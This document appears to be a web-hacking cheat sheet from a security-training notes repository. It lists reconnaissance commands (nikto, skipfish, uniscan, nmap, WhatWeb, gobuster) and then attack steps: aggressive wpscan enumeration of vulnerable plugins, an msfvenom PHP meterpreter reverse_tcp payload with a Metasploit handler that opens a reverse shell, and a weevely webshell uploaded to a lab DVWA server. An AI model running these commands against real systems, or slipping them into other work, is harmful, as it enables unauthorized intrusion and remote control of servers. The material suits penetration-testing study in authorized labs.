## Hacking web cheat sheet

### Gathering web server

#### Finding default content of web server using nikto

```sh
nikto -h [HOST] -Tuning x
```

#### Analyze website using skipfish

```sh
skipfish -o /root/output -S /usr/share/skipfish/dictionaries/complete.wl [HOST:8080]
```

#### Discover web directories using uniscan

```sh
uniscan -u [HOST] -q
```

#### Discover robots.txt and sitemap.xml files using uniscan
```sh
uniscan -u [HOST] -we
```

#### Perform dynamic tests using uniscan
Obtains information about emails, source code disclosures, and external hosts.

```sh
uniscan -u [HOST] -d
```

#### Perform a port and service discovery scan using nmap

```sh
nmap -T4 -A -v [HOST]
```

#### Perform web application reconnaissance using WhatWeb
WhatWeb recognizes web technologies, such as blogging platforms, email addresses, content management systems (CMS), account IDs, statistics and analytics packages, JavaScript libraries, and embedded devices. It also identifies version numbers, web servers, web framework modules, etc.

```sh
whatweb [HOST]
```

```sh
whatweb -v [HOST]
```

#### Detect Load Balancers

```sh
dig [HOST]
```
```sh
lbd [HOST]
```

#### Enumerate server using nmap (applications, directories, and files)

```sh
nmap -sV --script http-enum [HOST]
```

#### Fast-paced enumeration of the hidden files and directories of the target web application using Gobuster

```sh
gobuster dir -u [HOST] -w [DICTIONARY]
```

### Attack website

```sh
wpscan --api-token [API Token] --url [HOST] --plugins-detection aggressive --enumerate vp
```

--enumerate vp: Specifies the enumeration of vulnerable plugins.

### Create meterpreter php payload and encode using msfvenom

```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
```

Upload and open the file in the web server...

```sh
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST [IP Address of Host Machine]
set LPORT 4444
run
```

### Webshell using weevely

```sh
weevely generate [PASSWORD] [FILE PATH]
```

Upload the shell to the web server...

```sh
weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php [PASSWORD]
```


[<- Back to index](README.md)

---
## License

© 2021 [javierizquierdovera.com](https://javierizquierdovera.com)

Licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0) ([`LICENSE-APACHE`](LICENSE-APACHE)) or the [MIT license](https://opensource.org/licenses/MIT) ([`LICENSE-MIT`](LICENSE-MIT)), at your option.

`SPDX-License-Identifier: (Apache-2.0 OR MIT)`